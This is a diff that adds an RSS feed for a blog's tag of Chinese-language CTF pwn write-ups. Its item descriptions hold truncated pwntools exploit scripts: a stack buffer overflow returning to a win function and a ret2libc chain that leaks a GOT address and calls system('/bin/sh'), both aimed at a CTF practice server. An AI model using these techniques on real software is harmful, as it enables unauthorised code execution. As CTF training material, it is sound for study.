@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>PWN题解 on Blog</title>
+    <link>https://example.com/tags/pwn%E9%A2%98%E8%A7%A3/</link>
+    <description>Recent content in PWN题解 on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Athul</copyright>
+    <lastBuildDate>Thu, 22 Jun 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://example.com/tags/pwn%E9%A2%98%E8%A7%A3/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PWN简单题题解</title>
+      <link>https://example.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E5%88%B7%E9%A2%98/</link>
+      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E5%88%B7%E9%A2%98/</guid>
+      <description>picoctf_2018_buffer overflow 2 from pwn import * from LibcSearcher import* # context(arch = &amp;#39;amd64&amp;#39;, os = &amp;#39;linux&amp;#39;, log_level = &amp;#39;debug&amp;#39;) context.log_level = &amp;#39;debug&amp;#39; elf = ELF(&amp;#39;./bin/PicoCTF_2018_buffer_overflow_2&amp;#39;) p = remote(&amp;#39;node4.buuoj.cn&amp;#39;, 28842) # elf win = elf.symbols[&amp;#39;win&amp;#39;] main_addr = elf.symbols[&amp;#39;main&amp;#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b&amp;#39;a&amp;#39; * 0x6c + p32(0) + p32(win) + p32(main_addr) + p32(a1) + p32(a2) p.sendline(payload) p.interactive() 2023.6.4 jarvisoj_test_your_memory 这个题注意要最后返回到main函数，使得程序正常结束，不然程序崩溃不会回显flag
+from pwn import * from LibcSearcher import* # context(arch = &amp;#39;amd64&amp;#39;, os = &amp;#39;linux&amp;#39;, log_level = &amp;#39;debug&amp;#39;) context.</description>
+    </item>
+    
+    <item>
+      <title>简单题(旧)</title>
+      <link>https://example.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E7%AE%80%E5%8D%95%E9%A2%98%E6%97%A7/</link>
+      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E7%AE%80%E5%8D%95%E9%A2%98%E6%97%A7/</guid>
+      <description>2022-8-28 get_started_3dsctf_2016 | LiuLian (liul14n.top)
+2022-8-27 [OGeek2019]babyrop1 有一些本地 libc 函数的用法，参考一下
+from pwn import * from LibcSearcher import * p = remote(&amp;#34;node4.buuoj.cn&amp;#34;, 28820) elf=ELF(&amp;#39;./pwn1&amp;#39;) libc=ELF(&amp;#39;./libc-2.23.so&amp;#39;) system_libc=libc.symbols[&amp;#39;system&amp;#39;] binsh_libc=next(libc.search(b&amp;#39;/bin/sh&amp;#39;)) write_plt=elf.plt[&amp;#39;write&amp;#39;] write_got=elf.got[&amp;#39;write&amp;#39;] write_libc=libc.symbols[&amp;#39;write&amp;#39;] read_got=elf.got[&amp;#39;read&amp;#39;] read_plt=elf.plt[&amp;#39;read&amp;#39;] main_addr=0x8048825 #payload1-截断strlen payload1=b&amp;#39;\x00&amp;#39;+b&amp;#39;\xff&amp;#39;*7 p.sendline(payload1) p.recvuntil(&amp;#34;Correct\n&amp;#34;) #pay;pad2 - 泄露read的got地址 payload=b&amp;#39;a&amp;#39;*(0xe7+4)+p32(write_plt)+p32(main_addr) # ret1 ret2 payload+=p32(1)+p32(write_got)+p32(4) #write par1 par2 par3 #write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数 p.sendline(payload) write_addr=u32(p.recv(4)) print(&amp;#39;[+]write_addr: &amp;#39;, hex(write_addr))#得到了write在内存中的位置 可以用题目提供的函数共享库算出system在内存中的位置 # libc=LibcSearcher(&amp;#39;read&amp;#39;, read_addr) # libc_base=read_addr-libc.dump(&amp;#39;read&amp;#39;) # system_addr=libc_base+libc.dump(&amp;#39;system&amp;#39;) # binsh_addr=libc_base+libc.dump(&amp;#39;str_bin_sh&amp;#39;) libc_base=write_addr-write_libc system_addr=system_libc+libc_base binsh_addr=binsh_libc+libc_base p.sendline(payload1) p.recvuntil(&amp;#34;Correct\n&amp;#34;) payload=b&amp;#39;a&amp;#39;*(0xe7+4) payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)#第二次直接把返回地址改为addr地址 p.</description>
+    </item>
+    
+  </channel>
+</rss>
